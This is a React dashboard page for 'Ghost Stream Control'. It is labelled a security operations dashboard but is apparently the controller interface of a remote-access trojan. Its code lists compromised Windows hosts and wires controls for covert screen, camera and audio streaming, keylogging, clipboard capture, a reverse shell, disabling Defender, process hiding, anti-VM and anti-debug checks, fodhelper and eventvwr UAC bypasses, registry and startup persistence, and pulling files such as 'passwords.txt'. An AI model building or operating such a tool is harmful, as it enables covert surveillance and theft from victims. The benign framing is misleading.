import { useEffect, useMemo, useState } from "react";
import { useWebSocket } from "@/hooks/useWebSocket";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Separator } from "@/components/ui/separator";
import {
  DropdownMenu,
  DropdownMenuContent,
  DropdownMenuLabel,
  DropdownMenuRadioGroup,
  DropdownMenuRadioItem,
  DropdownMenuTrigger,
} from "@/components/ui/dropdown-menu";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import DoughnutChart from "@/components/charts/DoughnutChart";
import TrendLineChart from "@/components/charts/TrendLineChart";
import ActiveAgentsCard from "@/components/dashboard/ActiveAgentsCard";
import ConfigStatusCard from "@/components/dashboard/ConfigStatusCard";
import PasswordManagementCard from "@/components/dashboard/PasswordManagementCard";
import FilterToolbar from "@/components/dashboard/FilterToolbar";
import StreamingControlPanel from "@/components/streaming/StreamingControlPanel";
import SecurityControlPanel from "@/components/security/SecurityControlPanel";
import PersistenceControlPanel from "@/components/persistence/PersistenceControlPanel";
import MonitoringControlPanel from "@/components/monitoring/MonitoringControlPanel";
import FileTransferPanel from "@/components/filetransfer/FileTransferPanel";
import type { Agent, DashboardMetrics } from "@/types/dashboard";

// Small helper to update meta for SEO
const setMeta = (name: string, content: string) => {
  let el = document.querySelector(`meta[name="${name}"]`);
  if (!el) {
    el = document.createElement("meta");
    el.setAttribute("name", name);
    document.head.appendChild(el);
  }
  el.setAttribute("content", content);
};

const categories = [
  {
    key: "auth",
    label: "Authentication & Security",
    description:
      "Admin Settings: Manage passwords, session timeouts, max login attempts. Security Evasion: Disable Defender, hide processes, anti-VM/anti-debug.",
  },
  {
    key: "stream",
    label: "Streaming & Communication",
    description:
      "WebRTC Stream control with codecs, ABR, frame dropping. Status & Logs for server and streaming connection.",
  },
];

const checks = [
  {
    key: "agent",
    label: "Agent & System Health Checks",
  },
  {
    key: "webrtc",
    label: "WebRTC Streaming Checks",
  },
  {
    key: "server",
    label: "Controller & Server Checks",
  },
];

const ranges = [
  { key: "1h", label: "Last Hour" },
  { key: "24h", label: "Last 24 Hours" },
  { key: "7d", label: "Last 7 Days" },
  { key: "custom", label: "Custom Range" },
];

const Index = () => {
  const [category, setCategory] = useState("auth");
  const [check, setCheck] = useState("agent");
  const [range, setRange] = useState("24h");
  const [bypassView, setBypassView] = useState<'persistence' | 'uac'>("persistence");
  const [selectedAgent, setSelectedAgent] = useState<string | null>(null);
  const [activePanel, setActivePanel] = useState<string | null>(null);

  // WebSocket connection for real-time updates
  const { isConnected, lastMessage, sendMessage } = useWebSocket('ws://localhost:8080/ws');

  // Mock agent data - in real implementation, this would come from WebSocket
  const [agents, setAgents] = useState<Agent[]>([
    {
      id: "agent-001",
      hostname: "DESKTOP-ABC123",
      ip: "192.168.1.100",
      os: "Windows 11 Pro",
      status: "online",
      lastSeen: "2024-01-15T14:35:00Z",
      capabilities: ["screen", "camera", "audio", "keylogger", "clipboard"],
      streams: { screen: true, camera: false, audio: true },
      persistence: { registry: true, startup: true, scheduledTasks: false, services: true },
      security: { defenderDisabled: true, avDisabled: false, processHidden: true, antiVm: true, antiDebug: true },
      privileges: { admin: true, uacBypassed: true, method: "fodhelper.exe" }
    },
    {
      id: "agent-002", 
      hostname: "LAPTOP-XYZ789",
      ip: "192.168.1.101",
      os: "Windows 10 Home",
      status: "offline",
      lastSeen: "2024-01-15T13:20:00Z",
      capabilities: ["screen", "keylogger"],
      streams: { screen: false, camera: false, audio: false },
      persistence: { registry: false, startup: true, scheduledTasks: true, services: false },
      security: { defenderDisabled: false, avDisabled: false, processHidden: false, antiVm: false, antiDebug: false },
      privileges: { admin: false, uacBypassed: false, method: "" }
    }
  ]);

  // Mock file transfers
  const [fileTransfers, setFileTransfers] = useState([
    {
      id: "transfer-001",
      filename: "passwords.txt",
      size: 1024000,
      progress: 75,
      direction: "download" as const,
      status: "active" as const,
      speed: 102400
    },
    {
      id: "transfer-002", 
      filename: "screenshot.png",
      size: 2048000,
      progress: 100,
      direction: "upload" as const,
      status: "completed" as const,
      speed: 0
    }
  ]);

  useEffect(() => {
    document.title = "Ghost Stream Control – Security Dashboard";
    setMeta("description", "Realtime security, streaming and controller status dashboard with interactive charts.");
  }, []);

  // Handle WebSocket messages
  useEffect(() => {
    if (lastMessage) {
      console.log('Received WebSocket message:', lastMessage);
      // Handle different message types
      switch (lastMessage.type) {
        case 'agent_update':
          setAgents(prev => prev.map(agent => 
            agent.id === lastMessage.data.id ? { ...agent, ...lastMessage.data } : agent
          ));
          break;
        case 'metrics_update':
          // Update dashboard metrics
          break;
      }
    }
  }, [lastMessage]);

  // Agent control handlers
  const handleStreamToggle = (agentId: string, type: 'screen' | 'camera' | 'audio', action: 'start' | 'stop') => {
    sendMessage({
      type: 'stream_control',
      data: { agentId, streamType: type, action }
    });
  };

  const handleSecurityAction = (agentId: string, action: string, params?: any) => {
    sendMessage({
      type: 'security_control',
      data: { agentId, action, params }
    });
  };

  const handlePersistenceAction = (agentId: string, method: string, action: string, params?: any) => {
    sendMessage({
      type: 'persistence_control',
      data: { agentId, method, action, params }
    });
  };

  const handleMonitoringAction = (agentId: string, type: string, action: string, params?: any) => {
    sendMessage({
      type: 'monitoring_control',
      data: { agentId, type, action, params }
    });
  };

  const handleFileAction = (agentId: string, action: string, params?: any) => {
    sendMessage({
      type: 'file_control',
      data: { agentId, action, params }
    });
  };

  // Overview donut datasets
  const agentReport = useMemo(() => (
    [
      { name: "Problems", value: agents.filter(a => a.status === 'offline').length },
      { name: "Errors", value: agents.filter(a => !a.security.defenderDisabled && a.status === 'online').length },
      { name: "Bugs", value: agents.filter(a => !a.privileges.admin && a.status === 'online').length },
    ]
  ), []);

  const connectionStatus = useMemo(() => (
    [
      { name: "Connected", value: agents.filter(a => a.status === 'online').length },
      { name: "Offline", value: agents.filter(a => a.status === 'offline').length },
    ]
  ), [agents]);

  const persistenceMethods = useMemo(() => (
    [
      { name: "Registry Keys", value: agents.filter(a => a.persistence.registry).length },
      { name: "Startup Entries", value: agents.filter(a => a.persistence.startup).length },
      { name: "Scheduled Tasks", value: agents.filter(a => a.persistence.scheduledTasks).length },
    ]
  ), [agents]);

  const uacBypass = useMemo(() => (
    [
      { name: "EventVwr.exe Hijacking", value: agents.filter(a => a.privileges.method === 'EventVwr.exe').length },
      { name: "sdclt.exe Bypass", value: agents.filter(a => a.privileges.method === 'sdclt.exe').length },
      { name: "fodhelper.exe", value: agents.filter(a => a.privileges.method === 'fodhelper.exe').length },
    ]
  ), [agents]);

  // Trending line data (mocked)
  const [trendData, setTrendData] = useState(() =>
    Array.from({ length: 15 }).map((_, i) => ({
      name: `${i + 1}`,
      Security: Math.max(15, Math.min(95, 10 + i * 5)),
      Identity: Math.max(10, Math.min(98, 5 + i * 6)),
      Network: Math.max(5, Math.min(90, 3 + i * 4)),
      Service: Math.max(8, Math.min(92, 6 + i * 5)),
    }))
  );

  // Controller realtime metrics
  const [controllerData, setControllerData] = useState(() =>
    Array.from({ length: 20 }).map((_, i) => ({
      name: `${i}`,
      Latency: 40 + Math.round(Math.random() * 20),
      Agents: 40 + Math.round(Math.random() * 5),
      Service: 95 + Math.round(Math.random() * 3),
    }))
  );

  useEffect(() => {
    const id = setInterval(() => {
      setControllerData((prev) => {
        const next = {
          name: `${Number(prev[prev.length - 1].name) + 1}`,
          Latency: Math.max(25, Math.min(120, (prev[prev.length - 1].Latency + (Math.random() * 10 - 5)) | 0)),
          Agents: Math.max(35, Math.min(60, (prev[prev.length - 1].Agents + (Math.random() * 2 - 1)) | 0)),
          Service: Math.max(90, Math.min(100, (prev[prev.length - 1].Service + (Math.random() * 2 - 1)) | 0)),
        };
        const arr = [...prev.slice(-19), next];
        return arr;
      });
    }, 1500);
    return () => clearInterval(id);
  }, []);

  // Filter previews mimic same colors & style
  const filterPreviewDonut = (
    <div className="w-64">
      <DoughnutChart data={agentReport} totalLabel="Items" />
    </div>
  );

  const filterPreviewLine = (
    <div className="w-72">
      <TrendLineChart
        data={trendData}
        series={[
          { dataKey: "Security", name: "Security", colorIndex: 0 },
          { dataKey: "Identity", name: "Identity", colorIndex: 1 },
        ]}
      />
    </div>
  );

  return (
    <main className="min-h-screen bg-background">
      <header className="sticky top-0 z-40 backdrop-blur supports-[backdrop-filter]:bg-background/70 border-b">
        <div className="container py-4 flex flex-col gap-4">
          <div className="flex items-center justify-between">
            <h1 className="text-2xl font-semibold">Security Operations Dashboard</h1>
            <div className="hidden md:flex items-center gap-2">
              <Button variant="secondary" className="animate-glow">Overview</Button>
              <DropdownMenu>
                <DropdownMenuTrigger asChild>
                  <Button variant="secondary" className="animate-glow">Category</Button>
                </DropdownMenuTrigger>
                <DropdownMenuContent className="z-50 bg-popover">
                  <DropdownMenuLabel>Categories</DropdownMenuLabel>
                  <DropdownMenuRadioGroup value={category} onValueChange={setCategory}>
                    {categories.map((c) => (
                      <DropdownMenuRadioItem key={c.key} value={c.key}>
                        {c.label}
                      </DropdownMenuRadioItem>
                    ))}
                  </DropdownMenuRadioGroup>
                  <Separator className="my-2" />
                  {filterPreviewDonut}
                  <Separator className="my-2" />
                  {filterPreviewLine}
                </DropdownMenuContent>
              </DropdownMenu>

              <DropdownMenu>
                <DropdownMenuTrigger asChild>
                  <Button variant="secondary" className="animate-glow">Checks</Button>
                </DropdownMenuTrigger>
                <DropdownMenuContent className="z-50 bg-popover">
                  <DropdownMenuLabel>Checks</DropdownMenuLabel>
                  <DropdownMenuRadioGroup value={check} onValueChange={setCheck}>
                    {checks.map((c) => (
                      <DropdownMenuRadioItem key={c.key} value={c.key}>
                        {c.label}
                      </DropdownMenuRadioItem>
                    ))}
                  </DropdownMenuRadioGroup>
                  <Separator className="my-2" />
                  {filterPreviewDonut}
                  <Separator className="my-2" />
                  {filterPreviewLine}
                </DropdownMenuContent>
              </DropdownMenu>

              <DropdownMenu>
                <DropdownMenuTrigger asChild>
                  <Button variant="secondary" className="animate-glow">Time Range</Button>
                </DropdownMenuTrigger>
                <DropdownMenuContent className="z-50 bg-popover">
                  <DropdownMenuLabel>Log & Activity Filters</DropdownMenuLabel>
                  <DropdownMenuRadioGroup value={range} onValueChange={setRange}>
                    {ranges.map((r) => (
                      <DropdownMenuRadioItem key={r.key} value={r.key}>
                        {r.label}
                      </DropdownMenuRadioItem>
                    ))}
                  </DropdownMenuRadioGroup>
                  <Separator className="my-2" />
                  {filterPreviewDonut}
                  <Separator className="my-2" />
                  {filterPreviewLine}
                </DropdownMenuContent>
              </DropdownMenu>
            </div>
          </div>

          <p className="text-sm text-muted-foreground">
            {categories.find((c) => c.key === category)?.description}
          </p>
          <FilterToolbar category={category} check={check} range={range} />
        </div>
      </header>

      <section className="container py-6 grid gap-6">
        <div className="grid gap-6 md:grid-cols-12">
          <div className="md:col-span-12 lg:col-span-3">
            <Card className="h-full">
              <CardHeader>
                <CardTitle className="flex items-center justify-between">
                  Active Agents
                  <Badge variant={isConnected ? "default" : "destructive"}>
                    {isConnected ? "Connected" : "Disconnected"}
                  </Badge>
                </CardTitle>
              </CardHeader>
              <CardContent className="space-y-4">
                {agents.length === 0 ? (
                  <div className="rounded-lg border border-border bg-muted/20 p-6 text-center text-sm text-muted-foreground">
                    No agents connected
                  </div>
                ) : (
                  <div className="space-y-2">
                    {agents.map((agent) => (
                      <div key={agent.id} className="flex items-center justify-between p-2 border rounded">
                        <div className="space-y-1">
                          <div className="flex items-center gap-2">
                            <div className={`w-2 h-2 rounded-full ${agent.status === 'online' ? 'bg-green-500' : 'bg-red-500'}`} />
                            <span className="font-medium text-sm">{agent.hostname}</span>
                          </div>
                          <div className="text-xs text-muted-foreground">{agent.ip} • {agent.os}</div>
                        </div>
                        <Button
                          variant="outline"
                          size="sm"
                          onClick={() => {
                            setSelectedAgent(agent.id);
                            setActivePanel('streaming');
                          }}
                          disabled={agent.status !== 'online'}
                        >
                          Control
                        </Button>
                      </div>
                    ))}
                  </div>
                )}
                <div className="grid gap-2">
                  <Button
                    variant="secondary"
                    className="justify-start font-medium"
                    style={{ backgroundImage: "var(--gradient-primary)" }}
                    onClick={() => setActivePanel('overview')}
                  >
                    Agent Stats
                  </Button>
                  <Button 
                    variant="secondary" 
                    className="justify-start bg-muted/30"
                    onClick={() => setActivePanel('health')}
                  >
                    System Health
                  </Button>
                  <Button 
                    variant="secondary" 
                    className="justify-start bg-muted/30"
                    onClick={() => setActivePanel('processes')}
                  >
                    List Processes
                  </Button>
                  <Button 
                    variant="secondary" 
                    className="justify-start bg-muted/30"
                    onClick={() => window.location.reload()}
                  >
                    Refresh Dashboard
                  </Button>
                </div>
                <Separator />
              </CardContent>
            </Card>
          </div>

          <Card className="relative md:col-span-6 lg:col-span-3">
            <CardHeader>
              <CardTitle>Agent Report Status</CardTitle>
            </CardHeader>
            <CardContent>
              <DoughnutChart data={agentReport} totalLabel="Total Issues" />
            </CardContent>
          </Card>

          <Card className="md:col-span-6 lg:col-span-3">
            <CardHeader>
              <CardTitle>Agent Connection Status</CardTitle>
            </CardHeader>
            <CardContent>
              <DoughnutChart data={connectionStatus} totalLabel="Total Agents" />
            </CardContent>
          </Card>

          <Card className="md:col-span-12 lg:col-span-3">
            <CardHeader>
              <CardTitle>Bypass Status</CardTitle>
            </CardHeader>
            <CardContent>
              <Tabs value={bypassView} onValueChange={(v) => setBypassView(v as any)}>
                <TabsList className="mb-2">
                  <TabsTrigger value="persistence">Persistence Methods</TabsTrigger>
                  <TabsTrigger value="uac">UAC Bypass Methods</TabsTrigger>
                </TabsList>
                <TabsContent value="persistence" className="mt-2">
                  <DoughnutChart data={persistenceMethods} totalLabel="Active Methods" />
                </TabsContent>
                <TabsContent value="uac" className="mt-2">
                  <DoughnutChart data={uacBypass} totalLabel="Attempts" />
                </TabsContent>
              </Tabs>
            </CardContent>
          </Card>
        </div>

        <Card>
          <CardHeader>
            <CardTitle>Best Practice Checks Trending</CardTitle>
          </CardHeader>
          <CardContent>
            <TrendLineChart
              data={trendData}
              series={[
                { dataKey: "Security", name: "Security", colorIndex: 0 },
                { dataKey: "Identity", name: "Identity", colorIndex: 1 },
                { dataKey: "Network", name: "Network", colorIndex: 2 },
                { dataKey: "Service", name: "Service Setup", colorIndex: 3 },
              ]}
            />
          </CardContent>
        </Card>

        <div className="grid gap-6 md:grid-cols-12">
          <Card className="md:col-span-12 lg:col-span-9">
            <CardHeader>
              <CardTitle>Controller Status (Realtime)</CardTitle>
            </CardHeader>
            <CardContent>
              <TrendLineChart
                data={controllerData}
                series={[
                  { dataKey: "Latency", name: "Latency (ms)", colorIndex: 0 },
                  { dataKey: "Agents", name: "Online Agents", colorIndex: 1 },
                  { dataKey: "Service", name: "Service Health %", colorIndex: 3 },
                ]}
              />
            </CardContent>
          </Card>
          <div className="md:col-span-12 lg:col-span-3 grid gap-6">
            <ConfigStatusCard />
            <PasswordManagementCard />
          </div>
        </div>

        {/* Agent Control Panels */}
        {selectedAgent && activePanel && (
          <div className="space-y-6">
            <div className="flex items-center justify-between">
              <h2 className="text-xl font-semibold">
                Agent Control - {agents.find(a => a.id === selectedAgent)?.hostname}
              </h2>
              <div className="flex gap-2">
                <Button
                  variant={activePanel === 'streaming' ? 'default' : 'outline'}
                  size="sm"
                  onClick={() => setActivePanel('streaming')}
                >
                  Streaming
                </Button>
                <Button
                  variant={activePanel === 'security' ? 'default' : 'outline'}
                  size="sm"
                  onClick={() => setActivePanel('security')}
                >
                  Security
                </Button>
                <Button
                  variant={activePanel === 'persistence' ? 'default' : 'outline'}
                  size="sm"
                  onClick={() => setActivePanel('persistence')}
                >
                  Persistence
                </Button>
                <Button
                  variant={activePanel === 'monitoring' ? 'default' : 'outline'}
                  size="sm"
                  onClick={() => setActivePanel('monitoring')}
                >
                  Monitoring
                </Button>
                <Button
                  variant={activePanel === 'files' ? 'default' : 'outline'}
                  size="sm"
                  onClick={() => setActivePanel('files')}
                >
                  Files
                </Button>
                <Button
                  variant="ghost"
                  size="sm"
                  onClick={() => {
                    setSelectedAgent(null);
                    setActivePanel(null);
                  }}
                >
                  Close
                </Button>
              </div>
            </div>

            {activePanel === 'streaming' && selectedAgent && (
              <StreamingControlPanel
                agentId={selectedAgent}
                streams={{
                  screen: { active: true, bitrate: 2500, fps: 30, resolution: "1920x1080" },
                  camera: { active: false, bitrate: 0, fps: 0, resolution: "640x480" },
                  audio: { active: true, bitrate: 128, sampleRate: 44100 }
                }}
                onStreamToggle={(type, action) => handleStreamToggle(selectedAgent, type, action)}
              />
            )}

            {activePanel === 'security' && selectedAgent && (
              <SecurityControlPanel
                agentId={selectedAgent}
                security={agents.find(a => a.id === selectedAgent)?.security || {
                  defenderDisabled: false,
                  avDisabled: false,
                  processHidden: false,
                  antiVm: false,
                  antiDebug: false
                }}
                onSecurityAction={(action, params) => handleSecurityAction(selectedAgent, action, params)}
              />
            )}

            {activePanel === 'persistence' && selectedAgent && (
              <PersistenceControlPanel
                agentId={selectedAgent}
                persistence={{
                  registry: { active: true, count: 3, entries: ["HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Agent"] },
                  startup: { active: true, count: 1, entries: ["C:\\Users\\Admin\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\agent.exe"] },
                  scheduledTasks: { active: false, count: 0, entries: [] },
                  services: { active: true, count: 1, entries: ["GhostService"] }
                }}
                onPersistenceAction={(method, action, params) => handlePersistenceAction(selectedAgent, method, action, params)}
              />
            )}

            {activePanel === 'monitoring' && selectedAgent && (
              <MonitoringControlPanel
                agentId={selectedAgent}
                monitoring={{
                  keylogger: { active: true, keyCount: 1247, lastActivity: "2024-01-15T14:35:20Z" },
                  clipboard: { active: true, clipCount: 23, lastClipboard: "https://example.com/secret" },
                  reverseShell: { active: false, commandCount: 0, lastCommand: "" },
                  voiceControl: { active: false, commandCount: 0, lastCommand: "" }
                }}
                onMonitoringAction={(type, action, params) => handleMonitoringAction(selectedAgent, type, action, params)}
              />
            )}

            {activePanel === 'files' && selectedAgent && (
              <FileTransferPanel
                agentId={selectedAgent}
                transfers={fileTransfers}
                onFileAction={(action, params) => handleFileAction(selectedAgent, action, params)}
              />
            )}
          </div>
        )}
      </section>
    </main>
  );
};

export default Index;
